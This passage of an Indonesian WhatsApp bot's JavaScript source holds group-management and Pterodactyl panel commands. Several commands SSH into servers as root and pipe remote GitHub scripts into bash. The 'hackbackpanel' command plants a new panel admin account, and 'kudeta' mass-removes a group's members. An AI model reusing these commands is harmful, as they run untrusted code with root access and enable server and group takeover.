//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await gisnaxd.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await gisnaxd.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await gisnaxd.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await gisnaxd.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await gisnaxd.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await gisnaxd.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await gisnaxd.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await gisnaxd.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await gisnaxd.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht": case "hidetag": {
if (!isCreator) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await gisnaxd.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await gisnaxd.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await gisnaxd.newsletterMetadata("invite", result)
await gisnaxd.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autotyping": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autotyping == true) return m.reply(`*Autotyping* sudah aktif!`)
global.db.settings.autotyping = true
return m.reply("Berhasil menyalakan *autotyping*")
} else if (teks == "off") {
if (global.db.settings.autotyping == false) return m.reply(`*Autotyping* tidak aktif!`)
global.db.settings.autotyping = false
return m.reply("Berhasil mematikan *autotyping*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "autoreadsw": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.readsw == true) return m.reply(`*Autoreadsw* sudah aktif!`)
global.db.settings.readsw = true
return m.reply("Berhasil menyalakan *autoreadsw*")
} else if (teks == "off") {
if (global.db.settings.readsw == false) return m.reply(`*Autoreadsw* tidak aktif!`)
global.db.settings.readsw = false
return m.reply("Berhasil mematikan *autoreadsw*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "blgc": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await gisnaxd.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await gisnaxd.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By BotShop Starting 🔥")
for (let i of memberFilter) {
await gisnaxd.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await gisnaxd.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await gisnaxd.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285624297893\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const gisnaxdSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).gisnaxdect(gisnaxdSettings)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const gisnaxdSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By Skyzo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).gisnaxdect(gisnaxdSettings);
}
break  

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "startwings": case "configurewings": {
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const gisnaxdSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await gisnaxd.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('gisnaxdection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).gisnaxdect(gisnaxdSettings);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("skyzoo|ipserver"))
if (!text.split("|")) return m.reply(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await gisnaxd.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `🚴 | 𝙱𝙾𝚃𝚂𝙷𝙾𝙿 V4`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
